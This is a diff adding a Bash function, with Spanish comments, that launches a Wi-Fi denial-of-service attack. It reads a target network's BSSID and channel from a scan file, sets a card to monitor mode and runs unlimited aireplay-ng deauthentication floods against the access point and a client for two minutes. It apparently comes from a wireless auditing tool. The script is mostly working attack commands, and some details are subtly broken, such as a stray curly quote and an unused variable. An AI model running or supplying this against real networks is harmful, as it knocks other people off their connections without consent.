@@ -1,0 +1,44 @@
+DenegacionServicio (){
+	echo "***************** Denegacion de Servicio******************"
+	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
+	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
+	CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
+	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
+	
+	TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
+	echo "MAC:$TARJETA_SELECCIONADA_MAC”# Tarjeta MAC seleccionada.
+	
+	TARJETA_MODO_MONITOR=$(head -2 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
+	sudo airmon-ng stop $TARJETA_MODO_MONITOR
+	sleep 5
+
+	X1="airmon-ng start $TARJETA_MODO_MONITOR $CANAL"
+	sudo xterm -hold -e "airmon-ng start $TARJETA_MODO_MONITOR $CANAL" &
+	sleep 2
+	X2="aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR"
+	sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR" &
+
+	#SI hay cliente conectado
+	BuscarClienteConectado $BSSID
+	X3="aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
+	sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+
+	TIEMPO_ESCANEO="120"
+	for A in `seq 1 $TIEMPO_ESCANEO` 
+	do
+		sleep 1s
+		if [ $A -eq $TIEMPO_ESCANEO ]
+		then
+			sudo killall xterm
+		else
+			TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
+		fi
+	done
+	
+	#Comprobar la DOS
+
+	(sudo python "$RUTA_INFORME/SUBSDOS.py" "$X1" "$X2" "$X3" "$X4")
+	sudo airmon-ng stop $TARJETA_MODO_MONITOR
+	sleep 5
+	sudo airmon-ng start $TARJETA_MODO_MONITOR
+}
